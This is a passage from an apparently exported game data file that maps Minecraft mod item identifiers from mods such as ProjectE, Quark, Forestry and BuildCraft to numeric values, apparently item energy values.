  ""railcraft:bloodstained|0"": 36,
  ""minecraft:golden_horse_armor|0"": 12336,
  ""quark:andesite_speleothem|0"": 8,
  ""mocreatures:tall_wyvgrass|0"": 1,
  ""railcraft:abyssal_stone|0"": 32,
  ""ichunutil:compact_porkchop|0"": 576,
  ""mocreatures:mossy_cobbled_deep_wyvstone_stairs|0"": 1,
  ""quark:colored_flowerpot_magenta|0"": 64,
  ""extratrees:stairs.whitebeam|0"": 6,
  ""forestry:fences.0|8"": 13,
  ""forestry:fences.1|9"": 13,
  ""quark:stained_clay_tiles_lime_stairs|0"": 48,
  ""forestry:fences.0|9"": 13,
  ""forestry:fences.1|8"": 13,
  ""forestry:fences.0|10"": 13,
  ""forestry:fences.1|11"": 13,
  ""forestry:fences.0|11"": 13,
  ""forestry:fences.1|10"": 13,
  ""forestry:fences.0|12"": 13,
  ""forestry:fences.0|13"": 13,
  ""forestry:fences.1|12"": 13,
  ""forestry:fences.0|14"": 13,
  ""forestry:fences.0|15"": 13,
  ""forestry:fences.0|0"": 13,
  ""forestry:fences.1|1"": 13,
  ""forestry:fences.0|1"": 13,
  ""forestry:fences.1|0"": 13,
  ""forestry:fences.0|2"": 13,
  ""forestry:fences.1|3"": 13,
  ""forestry:fences.0|3"": 13,
  ""forestry:fences.1|2"": 13,
  ""forestry:fences.0|4"": 13,
  ""forestry:fences.1|5"": 13,
  ""forestry:fences.0|5"": 13,
  ""forestry:fences.1|4"": 13,
  ""forestry:fences.0|6"": 13,
  ""forestry:fences.1|7"": 13,
  ""forestry:fences.0|7"": 13,
  ""forestry:fences.1|6"": 13,
  ""quark:nether_brick_fence_gate|0"": 12,
  ""forestry:stairs.giganteum|0"": 6,
  ""forestry:stairs.wenge|0"": 6,
  ""buildcrafttransport:pipe_emzuli_item|16"": 11872,
  ""quark:paper_wall|0"": 20,
  ""projectred-exploration:diamond_sickle|0"": 24580,
  ""forestry:fence.gates.baobab|0"": 32,
  ""minecraft:pumpkin_seeds|0"": 36,
  ""quark:sugar_block|0"": 288,
  ""buildcrafttransport:pipe_emzuli_item|1"": 11872,
  ""buildcrafttransport:pipe_emzuli_item|2"": 11872,
  ""buildcrafttransport:pipe_emzuli_item|3"": 11872,
  ""extratrees:doors.cypress|0"": 16,
  ""buildcrafttransport:pipe_emzuli_item|4"": 11872,
  ""buildcrafttransport:pipe_emzuli_item|5"": 11872,
  ""forestry:doors.plum|0"": 16,
  ""buildcrafttransport:pipe_emzuli_item|6"": 11872,
  ""buildcrafttransport:pipe_emzuli_item|7"": 11872,
  ""buildcrafttransport:pipe_emzuli_item|8"": 11872,
  ""buildcrafttransport:pipe_emzuli_item|9"": 11872,
  ""quark:stained_planks_silver_stairs|0"": 6,
  ""buildcrafttransport:pipe_emzuli_item|10"": 11872,
  ""buildcrafttransport:pipe_emzuli_item|11"": 11872,
  ""buildcrafttransport:pipe_emzuli_item|12"": 11872,
  ""buildcrafttransport:pipe_emzuli_item|13"": 11872,
  ""buildcrafttransport:pipe_emzuli_item|14"": 11872,
  ""buildcrafttransport:pipe_emzuli_item|15"": 11872,
  ""minecraft:tnt|0"": 964,
  ""quark:bark_acacia_stairs|0"": 24,
  ""cathedral:cathedral_gargoyle_demon_sandstone|0"": 265,
  ""minecraft:arrow|0"": 14,
  ""projecte:condenser_mk1|0"": 42011,
  ""projecte:condenser_mk2|0"": 9741339,
  ""chisel:factory|0"": 32,
  ""minecraft:iron_axe|0"": 776,
  ""quark:rope|0"": 48,
  ""railcraft:badlands_paver_stairs|0"": 25,
  ""extratrees:doors.syzgium|0"": 16,
  ""forestry:fence.gates.acacia|0"": 32,
  ""minecraft:stained_glass|2"": 1,
  ""minecraft:stained_glass|3"": 1,
  ""minecraft:stained_glass|0"": 1,
  ""minecraft:stained_glass|1"": 1,
  ""minecraft:stained_glass|6"": 1,
  ""minecraft:stained_glass|7"": 1,
  ""minecraft:stained_glass|4"": 1,
  ""minecraft:stained_glass|5"": 1,
  ""minecraft:stained_glass|10"": 1,
  ""minecraft:stained_glass|11"": 1,
  ""minecraft:stained_glass|8"": 1,
  ""minecraft:stained_glass|9"": 1,
  ""minecraft:stained_glass|14"": 1,
  ""minecraft:stained_glass|15"": 1,
  ""minecraft:stained_glass|12"": 1,
  ""extratrees:stairs.butternut|0"": 6,
  ""minecraft:stained_glass|13"": 1,
  ""forestry:slabs.2|4"": 4,
  ""forestry:slabs.0|6"": 4,
  ""forestry:slabs.1|5"": 4,
  ""forestry:slabs.0|7"": 4,
  ""forestry:slabs.2|5"": 4,
  ""forestry:slabs.1|4"": 4,
  ""forestry:slabs.2|6"": 4,
  ""forestry:slabs.0|4"": 4,
  ""forestry:slabs.1|7"": 4,
  ""forestry:slabs.0|5"": 4,
  ""forestry:slabs.2|7"": 4,
  ""forestry:slabs.1|6"": 4,
  ""minecraft:armor_stand|0"": 24,
  ""forestry:slabs.2|0"": 4,
  ""forestry:slabs.0|2"": 4,
  ""forestry:slabs.1|1"": 4,
  ""forestry:slabs.0|3"": 4,
  ""forestry:slabs.2|1"": 4,
  ""forestry:slabs.1|0"": 4,
  ""forestry:slabs.2|2"": 4,
  ""forestry:slabs.0|0"": 4,
  ""forestry:slabs.1|3"": 4,
  ""forestry:slabs.0|1"": 4,
  ""forestry:slabs.2|3"": 4,
  ""forestry:slabs.1|2"": 4,
  ""forestry:slabs.3|3"": 4,
  ""forestry:slabs.3|2"": 4,
  ""quark:icy_stone_brick_wall|0"": 64,
  ""forestry:slabs.3|1"": 4,
  ""forestry:slabs.3|0"": 4,
  ""forestry:slabs.3|4"": 4,
  ""buildcrafttransport:pipe_obsidian_item|11"": 16,
  ""buildcrafttransport:pipe_obsidian_item|10"": 16,
  ""buildcrafttransport:pipe_obsidian_item|9"": 16,
  ""buildcrafttransport:pipe_obsidian_item|8"": 16,
  ""buildcrafttransport:pipe_obsidian_item|15"": 16,
  ""buildcrafttransport:pipe_obsidian_item|14"": 16,
  ""extratrees:doors.hornbeam|0"": 16,
  ""buildcrafttransport:pipe_obsidian_item|13"": 16,
  ""buildcrafttransport:pipe_obsidian_item|12"": 16,
  ""buildcrafttransport:pipe_obsidian_item|3"": 16,
  ""buildcrafttransport:pipe_obsidian_item|2"": 16,
  ""buildcrafttransport:pipe_obsidian_item|1"": 16,
  ""buildcrafttransport:pipe_obsidian_item|7"": 16,
  ""buildcrafttransport:pipe_obsidian_item|6"": 16,
  ""buildcrafttransport:pipe_obsidian_item|5"": 16,
  ""buildcrafttransport:pipe_obsidian_item|4"": 16,
  ""projecte:relay_mk1|0"": 74177,
  ""minecraft:chicken|0"": 64,
  ""buildcrafttransport:pipe_obsidian_item|16"": 16,
  ""projecte:relay_mk3|0"": 681281,
  ""projecte:relay_mk2|0"": 213889,
  ""minecraft:diamond_hoe|0"": 16392,
  ""extratrees:fence.gates.pear|0"": 32,
  ""forestry:can|0"": 64,
  ""extratrees:stairs.syzgium|0"": 6,
  ""quark:turf_slab|0"": 2,
  ""ironchest:gold_diamond_chest_upgrade|0"": 18438,
  ""extratrees:fence.gates.cypress|0"": 32,
  ""minecraft:item_frame|0"": 96,
  ""minecraft:minecart|0"": 1280,
  ""forestry:doors.acacia|0"": 16,
  ""quark:hardened_clay_tiles_stairs|0"": 48,
  ""minecraft:iron_block|0"": 2304,
  ""extratrees:fence.gates.sweetgum|0"": 32,
  ""chisel:offsettool|0"": 1540,
  ""forestry:doors.padauk|0"": 16,
  ""quark:stained_clay_tiles|4"": 64,
  ""quark:stained_clay_tiles|5"": 64,
  ""quark:stained_clay_tiles|6"": 64,
  ""quark:stained_clay_tiles|7"": 64,
  ""quark:stained_clay_tiles|0"": 64,
  ""quark:stained_clay_tiles|1"": 64,
  ""quark:stained_clay_tiles|2"": 64,
  ""quark:stained_clay_tiles|3"": 64,
  ""quark:stained_clay_tiles|12"": 64,
  ""quark:stained_clay_tiles|13"": 64,
  ""quark:stained_clay_tiles|14"": 64,
  ""forestry:fence.gates.plum|0"": 32,
  ""quark:stained_clay_tiles|15"": 64,
  ""quark:stained_clay_tiles|8"": 64,
  ""quark:stained_clay_tiles|9"": 64,
  ""quark:stained_clay_tiles|10"": 64,
  ""quark:stained_clay_tiles|11"": 64,
  ""quark:bark_acacia_slab|0"": 16,
  ""minecraft:dark_oak_stairs|0"": 6,
  ""minecraft:rotten_flesh|0"": 32,
  ""extratrees:fence.gates.syzgium|0"": 32,
  ""quark:stained_clay_tiles_blue_stairs|0"": 48,
  ""minecraft:acacia_door|0"": 16,
  ""minecraft:flower_pot|0"": 48,
  ""quark:trowel|0"": 516,
  ""quark:stone_andesite_wall|0"": 16,
  ""minecraft:furnace_minecart|0"": 1288,
  ""blockcraftery:editable_pressure_plate_mobs|0"": 16,
  ""quark:hardened_clay_tiles_slab|0"": 32,
  ""cathedral:deckprism|11"": 1,
  ""railcraft:glass|3"": 57,
  ""cathedral:deckprism|10"": 1,
  ""railcraft:glass|2"": 57,
  ""cathedral:deckprism|9"": 1,
  ""railcraft:glass|1"": 57,
  ""cathedral:deckprism|8"": 1,
  ""railcraft:glass|0"": 55,
  ""cathedral:deckprism|15"": 1,
  ""railcraft:glass|7"": 59,
  ""cathedral:deckprism|14"": 1,
  ""railcraft:glass|6"": 57,
  ""cathedral:deckprism|13"": 1,
  ""railcraft:glass|5"": 58,
  ""cathedral:deckprism|12"": 1,
  ""railcraft:glass|4"": 57,
  ""cathedral:deckprism|3"": 1,
  ""railcraft:glass|11"": 163,
  ""cathedral:deckprism|2"": 1,
  ""railcraft:glass|10"": 110,
  ""cathedral:deckprism|1"": 1,
  ""railcraft:glass|9"": 109,
  ""cathedral:deckprism|0"": 1,
  ""railcraft:glass|8"": 57,
  ""cathedral:deckprism|7"": 1,
  ""quark:sandstone_bricks_stairs|0"": 3,
  ""railcraft:glass|15"": 57,
  ""cathedral:deckprism|6"": 1,
  ""railcraft:glass|14"": 57,
  ""cathedral:deckprism|5"": 1,
  ""railcraft:glass|13"": 56,
  ""cathedral:deckprism|4"": 1,
  ""railcraft:glass|12"": 71,
  ""mocreatures:wyvwood_slab|0"": 4,
  ""quark:elder_prismarine_bricks_wall|0"": 288,
  ""forestry:fence.gates.ipe|0"": 32,
  ""minecraft:spider_eye|0"": 128,
  ""quark:stained_planks_red_slab|0"": 4,
  ""projecte:collector_mk3|0"": 710665,
  ""projecte:collector_mk2|0"": 232969,
  ""projecte:collector_mk1|0"": 82953,
  ""minecraft:stained_hardened_clay|7"": 64,
  ""minecraft:stained_hardened_clay|6"": 64,
  ""minecraft:stained_hardened_clay|5"": 64,
  ""minecraft:stained_hardened_clay|4"": 64,
  ""minecraft:stained_hardened_clay|3"": 64,
  ""minecraft:stained_hardened_clay|2"": 64,
  ""minecraft:stained_hardened_clay|1"": 64,
  ""minecraft:stained_hardened_clay|0"": 64,
  ""minecraft:stained_hardened_clay|15"": 64,
  ""minecraft:stained_hardened_clay|14"": 64,
  ""minecraft:stained_hardened_clay|13"": 64,
  ""extratrees:fence.gates.fig|0"": 32,
  ""minecraft:stained_hardened_clay|12"": 64,
  ""minecraft:stained_hardened_clay|11"": 64,
  ""mocreatures:wyvstone_pressure_plate|0"": 3,
  ""minecraft:stained_hardened_clay|10"": 64,
  ""minecraft:stained_hardened_clay|9"": 64,
  ""minecraft:stained_hardened_clay|8"": 64,
  ""extratrees:fence.gates.fir|0"": 32,
  ""minecraft:comparator|0"": 463,
  ""quark:stained_clay_tiles_light_blue_slab|0"": 32,
  ""irontanks:iron_tank|0"": 784,
  ""minecraft:beef|0"": 64,
  ""minecraft:stonebrick|0"": 1,
  ""forestry:doors.baobab|0"": 16,
  ""minecraft:stonebrick|1"": 9,
  ""minecraft:stonebrick|2"": 1,
  ""minecraft:stonebrick|3"": 1,
  ""quark:dark_oak_trapdoor|0"": 8,
  ""blockcraftery:editable_pressure_plate_items|0"": 16,
  ""minecraft:wooden_pickaxe|0"": 32,
  ""quark:framed_glass_pane|0"": 96,
  ""ic2:blockmetal|12"": 288,
  ""ic2:blockmetal|11"": 4608,
  ""ic2:blockmetal|8"": 2304,
  ""ic2:blockmetal|7"": 1152,
  ""minecraft:iron_boots|0"": 1024,
  ""chiselsandbits:chisel_diamond|0"": 8196,
  ""galacticraftplanets:asteroids_block|1"": 8,
  ""galacticraftplanets:asteroids_block|0"": 8,
  ""galacticraftplanets:asteroids_block|2"": 8,
  ""minecraft:end_bricks|0"": 1,
  ""irontanks:iron_gold_upgrade|0"": 8449,
  ""cathedral:cathedral_glass_stained|0"": 62,
  ""cathedral:cathedral_glass_stained|1"": 62,
  ""minecraft:feather|0"": 48,
  ""minecraft:log|0"": 32,
  ""minecraft:log|1"": 32,
  ""minecraft:log|2"": 32,
  ""minecraft:log|3"": 32,
  ""extratrees:doors.gingko|0"": 16,
  ""quark:arrow_ender|0"": 1038,
  ""cathedral:cathedral_gargoyle_demon_endstone|0"": 253,
  ""quark:stained_planks_yellow_stairs|0"": 6,
  ""quark:variant_leaves|1"": 1,
  ""quark:variant_leaves|0"": 1,
  ""forestry:doors.lime|0"": 16,
  ""minecraft:diamond|0"": 8192,
  ""extratrees:stairs.cypress|0"": 6,
  ""minecraft:black_glazed_terracotta|0"": 64,
  ""mocreatures:deep_wyvstone_wall|0"": 1,
  ""forestry:stairs.kapok|0"": 6,
  ""forestry:stairs.willow|0"": 6,
  ""minecraft:blue_glazed_terracotta|0"": 64,
  ""minecraft:sandstone_stairs|0"": 3,
  ""quark:iron_ladder|0"": 112,
  ""railcraft:infernal_brick_stairs|0"": 39,
  ""chiselsandbits:wrench_wood|0"": 24,
  ""railcraft:nether|1"": 4,
  ""railcraft:nether|3"": 4,
  ""railcraft:nether|2"": 4,
  ""railcraft:nether|5"": 4,
  ""railcraft:nether|4"": 28,
  ""minecraft:slime_ball|0"": 32,
  ""quark:prismarine_dark_slab|0"": 1032,
  ""minecraft:sticky_piston|0"": 380,
  ""forestry:stairs.zebrawood|0"": 6,
  ""quark:sandstone_bricks_slab|0"": 2,
  ""binniecore:glass|0"": 1,
  ""chisel:planks-dark-oak|14"": 8,
  ""minecraft:nether_brick|0"": 4,
  ""chisel:planks-dark-oak|12"": 8,
  ""chisel:planks-dark-oak|13"": 8,
  ""chisel:planks-dark-oak|10"": 8,
  ""chisel:planks-dark-oak|11"": 8,
  ""chisel:planks-dark-oak|8"": 8,
  ""quark:colored_flowerpot_silver|0"": 64,
  ""chisel:planks-dark-oak|9"": 8,
  ""chisel:planks-dark-oak|6"": 8,
  ""chisel:planks-dark-oak|7"": 8,
  ""minecraft:glowstone|0"": 1536,
  ""chisel:planks-dark-oak|4"": 8,
  ""chisel:planks-dark-oak|5"": 8,
  ""chisel:planks-dark-oak|2"": 8,
  ""chisel:planks-dark-oak|3"": 8,
  ""chisel:planks-dark-oak|0"": 8,
  ""chisel:planks-dark-oak|1"": 8,
  ""quark:horse_whistle|0"": 64,
  ""minecraft:tripwire_hook|0"": 134,
  ""quark:brick_wall|0"": 64,
  ""quark:sturdy_stone|0"": 2,
  ""minecraft:birch_stairs|0"": 6,
  ""chisel:waterstone|0"": 1,
  ""minecraft:daylight_detector|0"": 783,
  ""quark:jungle_trapdoor|0"": 8,
  ""quark:stonebrick_mossy_stairs|0"": 6,
  ""minecraft:fence|0"": 13,
  ""minecraft:planks|5"": 8,
  ""extratrees:planks.0|6"": 8,
  ""extratrees:planks.1|7"": 8,
  ""minecraft:planks|4"": 8,
  ""extratrees:planks.0|7"": 8,
  ""extratrees:planks.1|6"": 8,
  ""extratrees:planks.0|4"": 8,
  ""extratrees:planks.1|5"": 8,
  ""extratrees:planks.0|5"": 8,
  ""extratrees:planks.1|4"": 8,
  ""quark:stained_clay_tiles_white_stairs|0"": 48,
  ""minecraft:planks|1"": 8,
  ""extratrees:planks.0|2"": 8,
  ""extratrees:planks.1|3"": 8,
  ""extratrees:planks.2|0"": 8,
  ""minecraft:planks|0"": 8,
  ""extratrees:planks.0|3"": 8,
  ""extratrees:planks.1|2"": 8,
  ""extratrees:planks.2|1"": 8,
  ""quark:duskbound_block_slab|0"": 50,
  ""minecraft:planks|3"": 8,
  ""extratrees:planks.0|0"": 8,
  ""extratrees:planks.1|1"": 8,
  ""extratrees:planks.2|2"": 8,
  ""minecraft:planks|2"": 8,
  ""extratrees:planks.0|1"": 8,
  ""extratrees:planks.1|0"": 8,
  ""extratrees:planks.2|3"": 8,
  ""extratrees:planks.0|14"": 8,
  ""extratrees:planks.1|15"": 8,
  ""extratrees:planks.0|15"": 8,
  ""extratrees:planks.1|14"": 8,
  ""extratrees:planks.0|12"": 8,
  ""extratrees:planks.1|13"": 8,
  ""extratrees:planks.0|13"": 8,
  ""extratrees:planks.1|12"": 8,
  ""forestry:ingot_bronze|0"": 160,
  ""minecraft:record_chirp|0"": 2048,
  ""extratrees:planks.0|10"": 8,
  ""extratrees:planks.1|11"": 8,
  ""extratrees:planks.0|11"": 8,
  ""extratrees:planks.1|10"": 8,
  ""extratrees:planks.0|8"": 8,
  ""extratrees:planks.1|9"": 8,
  ""extratrees:planks.0|9"": 8,
  ""extratrees:planks.1|8"": 8,
  ""quark:turf_stairs|0"": 3,
  ""buildcrafttransport:pipe_diamond_item|16"": 2048,
  ""buildcrafttransport:pipe_diamond_item|5"": 2048,
  ""buildcrafttransport:pipe_diamond_item|4"": 2048,
  ""buildcrafttransport:pipe_diamond_item|7"": 2048,
  ""buildcrafttransport:pipe_diamond_item|6"": 2048,
  ""buildcrafttransport:pipe_diamond_item|1"": 2048,
  ""buildcrafttransport:pipe_diamond_item|3"": 2048,
  ""buildcrafttransport:pipe_diamond_item|2"": 2048,
  ""minecraft:wooden_slab|1"": 4,
  ""buildcrafttransport:pipe_diamond_item|13"": 2048,
  ""minecraft:wooden_slab|0"": 4,
  ""buildcrafttransport:pipe_diamond_item|12"": 2048,
  ""minecraft:wooden_slab|3"": 4,
  ""buildcrafttransport:pipe_diamond_item|15"": 2048,
  ""minecraft:wooden_slab|2"": 4,
  ""buildcrafttransport:pipe_diamond_item|14"": 2048,
  ""minecraft:wooden_slab|5"": 4,
  ""buildcrafttransport:pipe_diamond_item|9"": 2048,
  ""minecraft:wooden_slab|4"": 4,
  ""buildcrafttransport:pipe_diamond_item|8"": 2048,
  ""buildcrafttransport:pipe_diamond_item|11"": 2048,
  ""minecraft:lit_pumpkin|0"": 153,
  ""buildcrafttransport:pipe_diamond_item|10"": 2048,
  ""quark:prismarine_bricks_wall|0"": 2304,
  ""quark:chute|0"": 44,
  ""minecraft:anvil|0"": 7936,
  ""minecraft:obsidian|0"": 64,
  ""extratrees:stairs.ash|0"": 6,
  ""projectred-exploration:sapphire_sickle|0"": 3076,
  ""minecraft:beetroot_seeds|0"": 16,
  ""microblockcbe:saw_stone|0"": 18,
  ""blockcraftery:editable_door_reinforced|0"": 66,
  ""quark:icy_stone_slab|0"": 32,
  ""minecraft:compass|0"": 1088,
  ""mocreatures:wyvwood_pressure_plate|0"": 24,
  ""forestry:doors.ipe|0"": 16,
  ""minecraft:cake|0"": 216,
  ""galacticraftcore:basic_block_core|13"": 288,
  ""galacticraftcore:basic_block_core|11"": 1152,
  ""chisel:bookshelf_darkoak|0"": 504,
  ""quark:stained_clay_tiles_light_blue_stairs|0"": 48,
  ""quark:limestone_wall|0"": 1,
  ""minecraft:jungle_fence_gate|0"": 32,
  ""forestry:stairs.balsa|0"": 6,
  ""railcraft:bloodstained_brick_stairs|0"": 27,
  ""quark:soul_sandstone_wall|0"": 196,
  ""quark:cobbed_stone_wall|0"": 16,
  ""chisel:glassdyedlightgray|3"": 1,
  ""chisel:glassdyedlightgray|2"": 1,
  ""chisel:glassdyedlightgray|1"": 1,
  ""chisel:glassdyedlightgray|0"": 1,
  ""extratrees:fence.gates.holly|0"": 32,
  ""chisel:antiblock|15"": 49,
  ""minecraft:cooked_mutton|0"": 64,
  ""chisel:glassdyedlightgray|5"": 1,
  ""chisel:glassdyedlightgray|4"": 1,
  ""quark:stone_granite_slab|0"": 8,
  ""extratrees:fence.gates.hawthorn|0"": 32,
  ""chisel:glassdyedpink|0"": 1,
  ""chisel:glassdyedpink|1"": 1,
  ""chisel:glassdyedpink|2"": 1,
  ""chisel:glassdyedpink|3"": 1,
  ""chisel:glassdyedpink|4"": 1,
  ""chisel:glassdyedpink|5"": 1,
  ""quark:stained_clay_tiles_red_slab|0"": 32,
  ""minecraft:wooden_hoe|0"": 24,
  ""mocreatures:wyvwood_door|0"": 16,
  ""minecraft:pumpkin|0"": 144,
  ""quark:stained_planks_purple_stairs|0"": 6,
  ""minecraft:bookshelf|0"": 528,
  ""minecraft:stone_sword|0"": 6,
  ""galacticraftcore:basic_item|17"": 928,
  ""galacticraftcore:basic_item|16"": 1024,
  ""galacticraftcore:basic_item|18"": 1024,
  ""quark:stonebrick_mossy_wall|0"": 9,
  ""galacticraftcore:basic_item|15"": 1152,
  ""galacticraftcore:basic_item|5"": 128,
  ""galacticraftcore:basic_item|4"": 256,
  ""extratrees:fence.gates.hornbeam|0"": 32,
  ""galacticraftcore:basic_item|3"": 128,
  ""galacticraftcore:basic_item|2"": 32,
  ""forbiddenmagicre:resourcefm|0"": 1820,
  ""minecraft:golden_leggings|0"": 14336,
  ""quark:bark_birch_wall|0"": 32,
  ""quark:duskbound_lantern|0"": 456,
  ""quark:elder_prismarine|1"": 288,
  ""quark:elder_prismarine|0"": 128,
  ""quark:sandy_bricks_stairs|0"": 48,
  ""quark:elder_prismarine|2"": 1040,
  ""minecraft:sapling|4"": 32,
  ""minecraft:sapling|5"": 32,
  ""mocreatures:wyvstone|0"": 1,
  ""minecraft:sapling|0"": 32,
  ""minecraft:sapling|1"": 32,
  ""minecraft:sapling|2"": 32,
  ""minecraft:sapling|3"": 32,
  ""galacticraftcore:ic2compat|2"": 128,
  ""galacticraftcore:ic2compat|0"": 128,
  ""minecraft:boat|0"": 40,
  ""forestry:doors.sequoia|0"": 16,
  ""galacticraftcore:moon_stairs_stone|0"": 1,
  ""minecraft:melon_block|0"": 144,
  ""minecraft:spruce_boat|0"": 40,
  ""extratrees:doors.alder|0"": 16,
  ""minecraft:paper|0"": 32,
  ""railcraft:diorite|1"": 16,
  ""railcraft:diorite|0"": 16,
  ""extratrees:fence.gates.butternut|0"": 32,
  ""railcraft:diorite|3"": 16,
  ""railcraft:diorite|5"": 16,
  ""railcraft:diorite|4"": 40,
  ""forestry:stairs.larch|0"": 6,
  ""extratrees:doors.cedar|0"": 16,
  ""minecraft:trapped_chest|0"": 198,
  ""minecraft:fire_charge|0"": 330,
  ""forestry:apatite|0"": 32,
  ""mocreatures:cobbled_wyvstone_wall|0"": 1,
  ""galacticraftcore:food|9"": 960,
  ""galacticraftcore:food|8"": 125,
  ""galacticraftcore:food|1"": 1024,
  ""quark:colored_flowerpot_brown|0"": 176,
  ""galacticraftcore:food|0"": 1152,
  ""galacticraftcore:food|3"": 1024,
  ""galacticraftcore:food|2"": 928,
  ""galacticraftcore:food|5"": 48,
  ""galacticraftcore:food|4"": 45,
  ""extratrees:doors.apple|0"": 16,
  ""galacticraftcore:food|7"": 32,
  ""galacticraftcore:food|6"": 32,
  ""minecraft:brick_stairs|0"": 48,
  ""minecraft:blaze_rod|0"": 1536,
  ""minecraft:heavy_weighted_pressure_plate|0"": 512,
  ""zettaindustries:sulfurblock|0"": 448,
  ""cathedral:cathedral_gargoyle_demon_packedice|0"": 265,
  ""forestry:stairs.acacia|0"": 6,
  ""minecraft:shield|0"": 304,
  ""projecte:item.pe_matter|1"": 466944,
  ""projecte:item.pe_matter|0"": 139264,
  ""quark:stone_wall|0"": 1,
  ""quark:stained_planks_red_stairs|0"": 6,
  ""minecraft:golden_sword|0"": 4100,
  ""quark:magma_bricks_stairs|0"": 48,
  ""quark:stained_planks_black_stairs|0"": 6,
  ""extratrees:stairs.beech|0"": 6,
  ""buildcrafttransport:pipe_emerald_power|1"": 4160,
  ""buildcrafttransport:pipe_emerald_power|2"": 4160,
  ""buildcrafttransport:pipe_emerald_power|3"": 4160,
  ""buildcrafttransport:pipe_emerald_power|4"": 4160,
  ""buildcrafttransport:pipe_emerald_power|5"": 4160,
  ""railcraft:metal|8"": 2304,
  ""buildcrafttransport:pipe_emerald_power|6"": 4160,
  ""buildcrafttransport:pipe_emerald_power|7"": 4160,
  ""railcraft:metal|9"": 1377,
  ""railcraft:metal|6"": 9216,
  ""buildcrafttransport:pipe_emerald_power|8"": 4160,
  ""railcraft:pearlized_brick_stairs|0"": 96,
  ""buildcrafttransport:pipe_emerald_power|9"": 4160,
  ""railcraft:metal|7"": 4608,
  ""buildcrafttransport:pipe_emerald_power|10"": 4160,
  ""buildcrafttransport:pipe_emerald_power|11"": 4160,
  ""railcraft:metal|2"": 4608,
  ""buildcrafttransport:pipe_emerald_power|12"": 4160,
  ""buildcrafttransport:pipe_emerald_power|13"": 4160,
  ""buildcrafttransport:pipe_emerald_power|14"": 4160,
  ""buildcrafttransport:pipe_emerald_power|15"": 4160,
  ""buildcrafttransport:pipe_emerald_power|16"": 4160,
  ""minecraft:gray_glazed_terracotta|0"": 64,
  ""minecraft:golden_chestplate|0"": 16384,
  ""minecraft:wheat_seeds|0"": 16,
  ""minecraft:stone_pressure_plate|0"": 2,
  ""minecraft:shears|0"": 512,
  ""minecraft:iron_nugget|0"": 28,
  ""minecraft:record_cat|0"": 2048,
  ""minecraft:diamond_pickaxe|0"": 24584,
  ""minecraft:cobblestone_wall|0"": 1,
  ""minecraft:cobblestone_wall|1"": 9,
  ""extratrees:doors.elm|0"": 16,
  ""minecraft:mushroom_stew|0"": 70,
  ""quark:duskbound_block|0"": 100,
  ""botany:stained|0"": 1,
  ""minecraft:dye|8"": 32,
  ""galacticraftcore:cheese|0"": 272,
  ""minecraft:dye|9"": 16,
  ""minecraft:dye|10"": 28,
  ""minecraft:dye|11"": 16,
  ""minecraft:dye|12"": 16,
  ""minecraft:dye|13"": 16,
  ""minecraft:dye|14"": 16,
  ""minecraft:dye|15"": 48,
  ""minecraft:dye|0"": 16,
  ""cathedral:cathedral_chain_various|3"": 10,
  ""minecraft:dye|1"": 16,
  ""quark:stained_clay_tiles_purple_stairs|0"": 48,
  ""minecraft:dye|2"": 8,
  ""cathedral:cathedral_chain_various|1"": 170,
  ""quark:stone_diorite_bricks_slab|0"": 8,
  ""minecraft:dye|3"": 128,
  ""cathedral:cathedral_chain_various|0"": 21,
  ""minecraft:dye|4"": 864,
  ""extratrees:stairs.pear|0"": 6,
  ""minecraft:dye|5"": 440,
  ""minecraft:dye|6"": 436,
  ""cathedral:cathedral_chain_various|5"": 42,
  ""minecraft:dye|7"": 16,
  ""mocreatures:mossy_cobbled_wyvstone|0"": 2,
  ""minecraft:waterlily|0"": 16,
  ""minecraft:grass_path|0"": 1,
  ""forestry:stairs.plum|0"": 6,
  ""quark:stained_clay_tiles_black_slab|0"": 32,
  ""quark:stained_clay_tiles_yellow_slab|0"": 32,
  ""forestry:ingot_copper|0"": 128,
  ""projectred-exploration:sapphire_shovel|0"": 1032,
  ""minecraft:leather_helmet|0"": 320,
  ""minecraft:string|0"": 12,
  ""irontanks:gold_tank|0"": 5912,
  ""minecraft:diamond_sword|0"": 16388,
  ""quark:smoker|0"": 128,
  ""quark:reed_block_slab|0"": 144,
  ""minecraft:diamond_axe|0"": 24584,
  ""quark:sandstone_smooth_slab|0"": 2,
  ""minecraft:gold_block|0"": 18432,
  ""cathedral:cathedral_gargoyle_demon_netherbrick|0"": 265,
  ""minecraft:red_nether_brick|0"": 50,
  ""minecraft:bone_block|0"": 432,
  ""projecte:dm_furnace|0"": 4456456,
  ""quark:spruce_pressure_plate|0"": 16,
  ""minecraft:redstone_lamp|0"": 1792,
  ""minecraft:banner|11"": 304,
  ""minecraft:banner|10"": 310,
  ""minecraft:banner|9"": 304,
  ""minecraft:banner|8"": 316,
  ""minecraft:banner|15"": 292,
  ""minecraft:banner|14"": 304,
  ""minecraft:banner|13"": 304,
  ""minecraft:banner|12"": 304,
  ""minecraft:banner|3"": 388,
  ""minecraft:banner|2"": 298,
  ""minecraft:banner|1"": 304,
  ""minecraft:banner|0"": 304,
  ""minecraft:banner|7"": 304,
  ""minecraft:banner|6"": 616,
  ""minecraft:banner|5"": 622,
  ""minecraft:banner|4"": 940,
  ""quark:turf|0"": 4,
  ""extratrees:stairs.box|0"": 6,
  ""irontanks:void_tank|0"": 92,
  ""extratrees:doors.iroko|0"": 16,
  ""extratrees:doors.whitebeam|0"": 16,
  ""minecraft:soul_sand|0"": 49,
  ""quark:polished_netherrack_bricks_slab|0"": 2,
  ""minecraft:map|0"": 256,
  ""botany:trowel_stone|0"": 6,
  ""buildcraftcore:decorated|5"": 68,
  ""railcraft:pearlized|1"": 129,
  ""extratrees:doors.holly|0"": 16,
  ""railcraft:granite|0"": 16,
  ""railcraft:pearlized|0"": 129,
  ""railcraft:granite|1"": 16,
  ""railcraft:pearlized|3"": 129,
  ""botany:trowel_gold|0"": 2053,
  ""railcraft:pearlized|2"": 129,
  ""railcraft:granite|3"": 16,
  ""railcraft:pearlized|5"": 129,
  ""railcraft:granite|4"": 40,
  ""railcraft:granite|5"": 16,
  ""railcraft:pearlized|4"": 153,
  ""extratrees:fence.gates.brazilwood|0"": 32,
  ""projectred-exploration:peridot_saw|0"": 2060,
  ""chisel:paper|0"": 8,
  ""chisel:cobblestone|0"": 1,
  ""chisel:cobblestone|1"": 1,
  ""chisel:cobblestone|2"": 1,
  ""chisel:cobblestone|3"": 1,
  ""chisel:cobblestone|4"": 1,
  ""chisel:cobblestone|5"": 1,
  ""forestry:fence.gates.padauk|0"": 32,
  ""chisel:cobblestone|6"": 1,
  ""chisel:cobblestone|7"": 1,
  ""chisel:cobblestone|8"": 1,
  ""chisel:cobblestone|9"": 1,
